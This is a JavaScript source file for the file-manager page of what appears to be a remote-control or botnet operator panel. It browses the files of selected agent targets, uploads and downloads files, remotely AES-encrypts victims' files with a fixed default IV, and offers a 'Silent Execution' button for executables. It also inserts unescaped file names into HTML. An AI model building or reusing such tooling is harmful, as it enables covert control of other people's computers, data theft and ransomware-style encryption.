import { CONFIG } from './modules/config.js';
import * as Logic from './logic.js';

/** @type {any} */
const win = window;

const fmState = {
    path: '',
    sep: '/',
    isWin: false
};
window.fmState = fmState;
win.navigateTo = (path) => {
    const targetPath = (path === undefined || path === null) ? "" : path;

    if (window.gateway && window.gateway.targetId && window.gateway.targetId !== 'ALL') {
        localStorage.setItem('last_fm_path_' + window.gateway.targetId, targetPath);
    }

    if (win.gateway) {
        win.gateway.listFiles(targetPath);
    }
};

document.addEventListener('DOMContentLoaded', () => {
    Logic.initAgentTargetFromURL(() => {
        console.log("File Manager: Target set via URL/Session");
    });

    injectBackButton();
    
    win.ui.renderFileList = (path, files) => {
        fmState.path = path;
        if (window.gateway && window.gateway.targetId && window.gateway.targetId !== 'ALL') {
            localStorage.setItem('last_fm_path_' + window.gateway.targetId, path);
        }
        
        fmState.isWin = path.includes('\\') || (path[1] === ':');
        fmState.sep = fmState.isWin ? '\\' : '/';
        
        const pathEl = document.getElementById('current-path');
        if (pathEl) pathEl.textContent = path;

        renderTreeView(path);
        renderFileTable(files);
    };

    const refreshBtn = document.querySelector('.fa-sync')?.parentElement;
    if (refreshBtn) {
        refreshBtn.onclick = () => win.navigateTo(fmState.path); 
    }

    setupUpload();

    const init = setInterval(() => {
        if (win.gateway?.isAuthenticated && win.gateway.targetId !== 'ALL') {
            const cacheKey = 'last_fm_path_' + win.gateway.targetId;
            const savedPath = localStorage.getItem(cacheKey) || "";
            win.navigateTo(savedPath); 
            clearInterval(init);
        }
    }, 500);
});

function renderFileTable(files) {
    const tbody = document.getElementById('file-list');
    if (!tbody) return;
    tbody.innerHTML = '';

    if (canGoUp(fmState.path)) {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td colspan="4" class="back-row"><i class="fa-solid fa-turn-up"></i> ..</td>`;
        tr.onclick = () => {
            let pts = fmState.path.split(/[/\\]/).filter(p => p);
            pts.pop();
            let newPath = pts.join(fmState.sep);
            if (!fmState.isWin && newPath) newPath = '/' + newPath;
            else if (fmState.isWin && newPath.length === 2) newPath += fmState.sep;
            win.navigateTo(newPath || (fmState.isWin ? "C:\\" : "/"));
        };
        tbody.appendChild(tr);
    }

    files.forEach(f => {
        const tr = document.createElement('tr');
        const isEncrypted = f.name.endsWith('.enc');
        const canExec = f.name.match(/\.(exe|bat|msi|cmd|sh|dmg|pkg)$/i);
        const iconHTML = f.isDirectory ? `<i class="fa-solid fa-folder text-yellow" style="margin-right:10px"></i>` : '';
        const safePath = f.path.replace(/\\/g, '\\\\');

        tr.innerHTML = `
            <td class="${f.isDirectory ? 'folder-click' : ''}" style="cursor:pointer; font-weight:500">
                ${iconHTML}${f.name}
            </td>
            <td style="color:#a3aed0">${f.isDirectory ? '-' : formatSize(f.size)}</td>
            <td style="color:#a3aed0">${f.modified || '-'}</td>
            <td>
                <div style="display:flex; justify-content:center; gap:8px">
                    ${!f.isDirectory ? `
                        <button class="btn-action btn-download" title="Download" onclick="window.gateway.send(CONFIG.CMD.FILE_DOWNLOAD, '${safePath}')">
                            <i class="fa-solid fa-arrow-down"></i>
                        </button>

                        <button class="btn-action ${isEncrypted ? 'btn-action-dec' : 'btn-action-enc'}" 
                                title="${isEncrypted ? 'Decrypt' : 'Encrypt'}" 
                                onclick="window.handleEncryptClick('${safePath}')">
                            <i class="fa-solid ${isEncrypted ? 'fa-unlock' : 'fa-lock'}"></i>
                        </button>

                        ${canExec ? `
                        <button class="btn-action btn-action-exec" title="Silent Execution" 
                                onclick="window.gateway.executeFile('${safePath}')">
                            <i class="fa-solid fa-play"></i>
                        </button>` : ''}
                    ` : ''}
                </div>
            </td>
        `;

        if (f.isDirectory) {
            tr.querySelector('td').onclick = () => win.navigateTo(f.path);
        }
        tbody.appendChild(tr);
    });
}

function renderTreeView(path) {
    const treeView = document.querySelector('.tree-view');
    if (!treeView) return;

    const parts = path.split(/[/\\]/).filter(p => p);
    let html = `<div class="tree-item" onclick="window.navigateTo('')"><i class="fa-solid fa-hard-drive"></i> Root</div>`;
    
    let currentAcc = "";
    parts.forEach((p, i) => {
        if (fmState.isWin && i === 0) currentAcc = p + '\\';
        else currentAcc += (fmState.isWin ? '' : '/') + p;
        
        const activeClass = (i === parts.length - 1) ? 'active' : '';
        html += `<div class="tree-item ${activeClass}" style="padding-left: ${(i+1)*15}px" 
                    onclick="window.navigateTo('${currentAcc.replace(/\\/g, '\\\\')}')"> 
                    <i class="fa-solid fa-folder"></i> ${p}
                </div>`;
    });
    treeView.innerHTML = html;
}

function setupUpload() {
    const uploadBtn = document.querySelector('.btn-orange');
    const input = document.createElement('input');
    input.type = 'file';
    input.style.display = 'none';
    document.body.appendChild(input);

    if (uploadBtn) uploadBtn.onclick = () => input.click();

    input.onchange = async () => {
        const file = input.files[0];
        if (!file) return;

        win.ui.log('System', `Initializing upload: ${file.name}`);
        win.gateway.send(CONFIG.CMD.FILE_UPLOAD, { path: fmState.path, fileName: file.name, size: file.size });
        
        const previousCallback = win.gateway.callbacks.onMessage;
        win.gateway.callbacks.onMessage = (msg) => {
            if (msg.type === CONFIG.CMD.FILE_UPLOAD && msg.data.status === 'ok') {
                sendNextChunk(file, msg.data.sessionId);
            }
            if (msg.type === CONFIG.CMD.FILE_COMPLETE && msg.data.msg?.toLowerCase().includes("upload")) {
                win.ui.log('System', `Successfully uploaded: ${file.name}`);
                alert(`Upload Successful: ${file.name}`);
                win.gateway.callbacks.onMessage = previousCallback;
                win.navigateTo(fmState.path); 
            } else if (previousCallback) {
                previousCallback(msg);
            }
        };
    };
}

function sendNextChunk(file, sessionId) {
    let offset = 0;
    const chunkSize = 32 * 1024;
    const reader = new FileReader();
    const readSlice = () => {
        if (offset >= file.size) return;
        const slice = file.slice(offset, offset + chunkSize);
        reader.onload = (e) => {
            const base64 = btoa(new Uint8Array(e.target.result).reduce((d, b) => d + String.fromCharCode(b), ''));
            win.gateway.send(CONFIG.CMD.FILE_CHUNK, { sessionId, data: base64 });
            offset += chunkSize;
            readSlice();
        };
        reader.readAsArrayBuffer(slice);
    };
    readSlice();
}

function canGoUp(p) { return p && (fmState.isWin ? p.length > 3 : p !== '/'); }

function formatSize(bytes) {
    if (bytes === 0) return '0 B';
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return (bytes / Math.pow(1024, i)).toFixed(1) + ' ' + ['B', 'KB', 'MB', 'GB'][i];
}

function injectBackButton() {
    const uploadBtn = document.querySelector('.btn-orange');
    if (uploadBtn && !document.querySelector('.btn-back-custom')) {
        const backBtn = document.createElement('button');
        backBtn.className = 'btn-back-custom'; 
        backBtn.innerHTML = `<img src="./assets/images/return.png" alt="back" style="width:20px">`;
        backBtn.onclick = () => window.location.href = 'advanced_menu.html';
        uploadBtn.after(backBtn); 
    }
}

let currentEncryptPath = "";

win.handleEncryptClick = (path) => {
    currentEncryptPath = path;
    const isEnc = path.endsWith('.enc');
    const modal = document.getElementById('option-modal');
    const groupIv = document.getElementById('group-iv');
    
    if (modal) {
        document.getElementById('modal-title').textContent = isEnc ? "AES Decryption" : "AES Encryption";
        document.getElementById('label-1').textContent = "Key:";
        document.getElementById('option-input-1').value = "";
        if (groupIv) groupIv.style.display = 'block';
        modal.style.display = 'flex';
    }
};

win.closeModal = () => {
    const modal = document.getElementById('option-modal');
    if (modal) modal.style.display = 'none';
};

const confirmBtn = document.getElementById('btn-modal-confirm');
if (confirmBtn) {
    confirmBtn.onclick = () => {
        const keyVal = document.getElementById('option-input-1').value;
        const ivVal = document.getElementById('option-input-2')?.value || "0123456789012345";
        
        win.gateway.send(CONFIG.CMD.FILE_ENCRYPT, { 
            path: currentEncryptPath, 
            key: keyVal, 
            iv: ivVal 
        });
        win.closeModal();
    };
}

win.handleSearch = () => {
    const query = document.getElementById('file-search').value.toLowerCase();
    const rows = document.querySelectorAll('#file-list tr');

    rows.forEach(row => {
        const fileNameCell = row.querySelector('td:first-child');
        if (fileNameCell) {
            const fileName = fileNameCell.textContent.toLowerCase();
            row.style.display = (fileName.includes(query) || fileName.includes('..')) ? "" : "none";
        }
    });
};